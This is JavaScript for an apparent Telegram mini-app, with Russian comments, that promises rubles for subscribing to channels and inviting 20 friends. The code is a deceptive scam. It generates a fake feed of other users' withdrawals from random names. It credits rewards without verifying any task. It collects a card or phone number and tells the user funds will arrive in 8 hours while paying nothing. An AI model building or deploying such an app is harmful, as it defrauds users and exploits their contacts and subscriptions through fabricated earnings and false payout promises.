// Инициализация Telegram Web App
const tg = window.Telegram.WebApp;
tg.expand();

// Класс для управления данными пользователя
class UserData {
    constructor() {
        this.userId = tg.initDataUnsafe.user?.id || 'user_' + Math.random().toString(36).substr(2, 9);
        this.loadUserData();
        
        // Проверяем реферальный параметр при запуске
        this.checkReferralParam();
    }

    loadUserData() {
        const savedData = localStorage.getItem(`user_${this.userId}`);
        if (savedData) {
            this.data = JSON.parse(savedData);
        } else {
            this.data = {
                username: tg.initDataUnsafe.user?.first_name || 'Пользователь',
                avatar: tg.initDataUnsafe.user?.photo_url || 'https://via.placeholder.com/40',
                balance: 0,
                completedTasks: [],
                referrals: [],
                referralCode: this.userId, // Просто ID пользователя как реферальный код
                lastWithdrawals: this.generateInitialWithdrawals()
            };
            this.saveUserData();
        }
    }

    generateInitialWithdrawals() {
        const names = ['Алексей', 'Мария', 'Дмитрий', 'Елена', 'Сергей', 'Анна', 'Иван', 'Ольга'];
        const withdrawals = [];
        
        for (let i = 0; i < 5; i++) {
            const name = names[Math.floor(Math.random() * names.length)];
            const lastName = names[Math.floor(Math.random() * names.length)];
            const amount = (Math.floor(Math.random() * 5) + 1) * 1000;
            
            withdrawals.push({
                user: `${name[0]}*** ${lastName[0]}******`,
                amount: amount
            });
        }
        
        return withdrawals;
    }

    saveUserData() {
        localStorage.setItem(`user_${this.userId}`, JSON.stringify(this.data));
    }

    updateBalance(amount) {
        this.data.balance += amount;
        this.saveUserData();
        this.updateUI();
    }

    checkReferralParam() {
        const startParam = tg.initDataUnsafe.start_param;
        if (startParam) {
            // Просто сохраняем, что пользователь пришел по рефералке
            // ID реферера уже передается в start_param от бота
            localStorage.setItem(`referred_${this.userId}`, startParam);
            
            setTimeout(() => {
                this.showNotification('✅ Вы пришли по реферальной ссылке!');
            }, 1000);
        }
    }

    completeTask(taskId) {
        if (!this.data.completedTasks.includes(taskId)) {
            this.data.completedTasks.push(taskId);
            
            const task = tasks.find(t => t.id === taskId);
            if (task) {
                this.updateBalance(task.reward);
            }
            
            this.saveUserData();
            this.updateUI();
        }
    }

    addWithdrawal(user, amount) {
        this.data.lastWithdrawals.unshift({
            user: user,
            amount: amount
        });
        
        if (this.data.lastWithdrawals.length > 5) {
            this.data.lastWithdrawals.pop();
        }
        
        this.saveUserData();
        this.updateUI();
    }

    updateUI() {
        document.getElementById('userName').textContent = this.data.username;
        document.getElementById('userAvatar').src = this.data.avatar;
        document.getElementById('userBalance').textContent = this.data.balance.toLocaleString() + ' ₽';
        
        this.renderWithdrawals();
        this.renderTasks();
    }

    renderWithdrawals() {
        const list = document.getElementById('withdrawalsList');
        list.innerHTML = this.data.lastWithdrawals.map(w => `
            <div class="withdrawal-item">
                <span class="withdrawal-user">${w.user}</span>
                <span class="withdrawal-amount">${w.amount.toLocaleString()} ₽</span>
            </div>
        `).join('');
    }

    renderTasks() {
        const tasksList = document.getElementById('tasksList');
        tasksList.innerHTML = tasks.map(task => {
            const isCompleted = this.data.completedTasks.includes(task.id);
            let progressHtml = '';
            let buttonText = 'Выполнить';
            let isDisabled = false;
            
            if (task.id === 'referral') {
                // Показываем только информацию, без кнопки
                progressHtml = `<div class="task-progress">✅ Реферальная ссылка отправлена в боте</div>`;
                buttonText = 'В боте';
                isDisabled = true;
            }
            
            if (isCompleted) {
                buttonText = 'Выполнено';
                isDisabled = true;
            }
            
            return `
                <div class="task-item">
                    <div class="task-info">
                        <div class="task-title">${task.title}</div>
                        ${progressHtml}
                    </div>
                    <span class="task-price">+${task.reward} ₽</span>
                    <button 
                        class="task-button ${isCompleted || task.id === 'referral' ? 'completed' : ''}" 
                        onclick="handleTask('${task.id}')"
                        ${isDisabled ? 'disabled' : ''}
                    >
                        ${buttonText}
                    </button>
                </div>
            `;
        }).join('');
    }

    showNotification(text) {
        const notification = document.getElementById('notification');
        notification.textContent = text;
        notification.style.display = 'block';
        
        setTimeout(() => {
            notification.style.display = 'none';
        }, 3000);
    }
}

// Задания
const tasks = [
    {
        id: 'channel1',
        title: 'Подписаться на @channel1',
        reward: 300
    },
    {
        id: 'channel2',
        title: 'Подписаться на @channel2',
        reward: 300
    },
    {
        id: 'channel3',
        title: 'Подписаться на @channel3',
        reward: 300
    },
    {
        id: 'channel4',
        title: 'Подписаться на @channel4',
        reward: 300
    },
    {
        id: 'channel5',
        title: 'Подписаться на @channel5',
        reward: 299
    },
    {
        id: 'referral',
        title: 'Пригласить 20 друзей (ссылка в боте)',
        reward: 6000
    }
];

// Инициализация пользователя
const user = new UserData();

// Функции для работы с модальным окном вывода
function showWithdrawModal() {
    if (user.data.balance < 1500) {
        user.showNotification('Минимальная сумма для вывода: 1500 ₽');
        return;
    }
    document.getElementById('withdrawModal').style.display = 'block';
}

function closeWithdrawModal() {
    document.getElementById('withdrawModal').style.display = 'none';
    document.getElementById('withdrawForm').innerHTML = '';
    document.getElementById('withdrawMessage').innerHTML = '';
}

function showWithdrawMethod(method) {
    const form = document.getElementById('withdrawForm');
    
    if (method === 'card') {
        form.innerHTML = `
            <input type="text" placeholder="Номер карты" id="cardNumber">
            <button onclick="processWithdraw('card')" class="withdraw-btn" style="margin-top: 12px;">Подтвердить</button>
        `;
    } else {
        form.innerHTML = `
            <input type="text" placeholder="Номер телефона" id="phoneNumber">
            <button onclick="processWithdraw('sbp')" class="withdraw-btn" style="margin-top: 12px;">Подтвердить</button>
        `;
    }
}

function processWithdraw(method) {
    let value = method === 'card' 
        ? document.getElementById('cardNumber')?.value 
        : document.getElementById('phoneNumber')?.value;
    
    if (!value) {
        user.showNotification('Заполните все поля');
        return;
    }
    
    const message = document.getElementById('withdrawMessage');
    message.innerHTML = 'Средства поступят в течение 8 часов';
    message.style.background = '#ffd700';
    message.style.color = '#000';
    
    const userName = user.data.username;
    const maskedName = userName.length > 2 
        ? userName[0] + '*** ' + userName.slice(-2) + '******'
        : 'Пользователь';
    
    user.addWithdrawal(maskedName, user.data.balance);
    user.updateBalance(-user.data.balance);
    
    setTimeout(closeWithdrawModal, 3000);
}

// Обработка заданий
function handleTask(taskId) {
    const task = tasks.find(t => t.id === taskId);
    
    if (!task || user.data.completedTasks.includes(taskId) || taskId === 'referral') {
        return;
    }
    
    user.showNotification(`Задание выполнено! Получено +${task.reward} ₽`);
    user.completeTask(taskId);
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        user.showNotification('Ссылка скопирована!');
    });
}

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    const modal = document.getElementById('withdrawModal');
    if (event.target === modal) {
        closeWithdrawModal();
    }
}

// Инициализация интерфейса
user.updateUI();